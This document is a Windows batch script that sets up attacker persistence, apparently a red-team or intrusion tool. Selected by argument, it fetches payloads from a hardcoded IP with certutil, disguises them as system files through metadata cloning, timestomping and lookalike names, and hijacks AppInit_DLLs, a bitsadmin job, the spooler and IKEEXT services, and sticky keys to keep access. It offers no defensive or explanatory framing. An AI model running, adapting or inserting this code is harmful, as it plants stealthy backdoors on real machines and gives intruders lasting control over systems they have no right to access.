rem @echo off

SET PORT=8443
SET IP=10.1.215.73

2>NUL CALL :CASE_%1
IF ERRORLEVEL 1 CALL :DEFAULT
EXIT /B

:CASE_appinit
REM UDP Psersistence AppInit keys
REM 64-bit
mkdir c:\temp
cd \temp
certutil.exe -urlcache -split -f "http://%IP%:%PORT%/touch.exe" touch.exe
certutil.exe -urlcache -split -f "http://%IP%:%PORT%/ditto.exe" ditto.exe
certutil.exe -urlcache -split -f "http://%IP%:%PORT%/updll64.dll" updll64.dll
certutil.exe -urlcache -split -f "http://%IP%:%PORT%/updll32.dll" updll32.dll
ditto.exe c:\windows\system32\sxs.dll updll64.dll
ditto.exe c:\windows\system32\sxs.dll updll32.dll
touch -t 201308220431 -- c:\temp\updll64.dll
touch -t 201308220431 -- c:\temp\updll32.dll
del ditto.exe
del touch.exe
move /y updll64.dll c:\windows\system32\sxsrv.dll
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /d "sxsrv.dll" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
REM 32-bit
move /y updll32.dll c:\windows\syswow64\sxsrv.dll
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /d "sxsrv.dll" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
GOTO DEFAULT

:CASE_bitsadmin
SET SERVICENAME=googleupdate
REM bitsadmin persistance
mkdir c:\temp
cd \temp
certutil.exe -urlcache -split -f "http://%IP%:%PORT%/up.exe" up.exe
certutil.exe -urlcache -split -f "http://%IP%:%PORT%/ditto.exe" ditto.exe
ditto.exe c:\windows\system32\dllhost.exe up.exe
touch -t 201308220431 -- c:\temp\up.exe
del touch.exe
del ditto.exe
move /y up.exe c:\windows\system32\dIlhost.exe
bitsadmin /rawreturn /reset
bitsadmin /rawreturn /create %SERVICENAME%
bitsadmin /rawreturn /addfile %SERVICENAME% c:\windows\system32\user32.dll c:\users\public\documents\user32.gif
bitsadmin /rawreturn /setnotifycmdline %SERVICENAME% c:\windows\system32\dIlhost.exe NULL
bitsadmin /rawreturn /setpriority %SERVICENAME% high
bitsadmin /rawreturn /resume %SERVICENAME%
GOTO DEFAULT

:CASE_service
REM service persistence
SET SERVICENAME=spooler
mkdir c:\temp
cd \temp
certutil.exe -urlcache -split -f "http://%IP%:%PORT%/up.exe" up.exe
certutil.exe -urlcache -split -f "http://%IP%:%PORT%/ditto.exe" ditto.exe
ditto.exe c:\windows\system32\spoolsv.exe up.exe
touch -t 201308220431 -- c:\temp\up.exe
del ditto.exe
del touch.exe
move /y up.exe c:\windows\system32\spoolsvc.exe
sc stop %SERVICENAME%
sc config %SERVICENAME% binpath= c:\windows\system32\spoolsvc.exe
sc start %SERVICENAME%
GOTO DEFAULT

:CASE_sdll
sc stop IKEEXT
mkdir c:\temp
cd \temp
certutil.exe -urlcache -split -f "http://%IP%:%PORT%/touch.exe" touch.exe
certutil.exe -urlcache -split -f "http://%IP%:%PORT%/ditto.exe" ditto.exe
certutil.exe -urlcache -split -f "http://%IP%:%PORT%/updll64.dll" updll64.dll
ditto.exe c:\windows\system32\crypt32.dll updll64.dll
touch -t 201308220431 -- c:\temp\updll64.dll
del touch.exe
del ditto.exe
del c:\windows\system32\crypt.dll
move /y updll64.dll c:\windows\system32\crypt.dll
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "c:\windows\system32\crypt.dll" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT" /v Start /t REG_DWORD /d 2 /f
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT\TriggerInfo" /f
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT\Parameters" /v ServiceMain /f
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT" /v DependOnService /f
sc config IKEEXT start= auto
sc start IKEEXT
GOTO DEFAULT

:CASE_sticky
mkdir c:\temp
cd \temp
copy /Y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
GOTO DEFAULT

:DEFAULT
REM self destruct
REM start /b "" cmd /c del "%~f0"&exit /b
